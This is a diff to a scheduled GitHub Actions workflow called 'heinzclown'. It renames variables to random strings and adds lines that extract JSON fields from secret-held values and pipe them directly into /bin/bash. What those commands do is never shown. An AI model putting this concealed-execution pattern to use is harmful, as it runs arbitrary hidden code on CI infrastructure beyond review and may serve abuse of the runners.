@@ -3,24 +3,35 @@ name: heinzclown
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '33 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heinzclown
         env:
-          p0538: ${{ secrets.p0538 }}
+          vbtq30468: ${{ secrets.vbtq30468 }}
         run: |
-          echo $p0538 | jq -r .q4569 | /bin/bash
-          echo $pbma91974 | jq -r .yyavq9 | /bin/bash
-          echo $y04 | jq -r .qc2683 | /bin/bash
-          echo $djm4 | jq -r .av848 | /bin/bash
-          echo $ebkwx45 | jq -r .th6 | /bin/bash
-          echo $cugr3229 | jq -r .ywvvz533 | /bin/bash
-          echo $gv3218 | jq -r .dq5281 | /bin/bash
-          echo $eshu9 | jq -r .n854 | /bin/bash
-          echo $be734 | jq -r .j2 | /bin/bash
+          echo $vbtq30468 | jq -r .sljw95859 | /bin/bash
+          echo $mu19 | jq -r .x381 | /bin/bash
+          echo $lxiz44 | jq -r .lodna55701 | /bin/bash
+          echo $yzz85301 | jq -r .wtrn6386 | /bin/bash
+          echo $wpbfr8 | jq -r .am8 | /bin/bash
+          echo $kgfq3693 | jq -r .jn13371 | /bin/bash
+          echo $exk15 | jq -r .wrvdm5 | /bin/bash
+          echo $ijwx5006 | jq -r .fluv362 | /bin/bash
+          echo $uf87 | jq -r .lkfo0 | /bin/bash
+          echo $x9886 | jq -r .r6365 | /bin/bash
+          echo $v66 | jq -r .jllvt9296 | /bin/bash
+          echo $ysz87964 | jq -r .aok292 | /bin/bash
+          echo $k9471 | jq -r .fl137 | /bin/bash
+          echo $ncd250 | jq -r .ippq22 | /bin/bash
+          echo $zjr76 | jq -r .pki70437 | /bin/bash
+          echo $gokg7 | jq -r .fm6 | /bin/bash
+          echo $zws90891 | jq -r .jj89 | /bin/bash
+          echo $evp72 | jq -r .nnx01 | /bin/bash
+          echo $q71 | jq -r .zslhg0 | /bin/bash
+          echo $hotz64 | jq -r .xltut7554 | /bin/bash
 
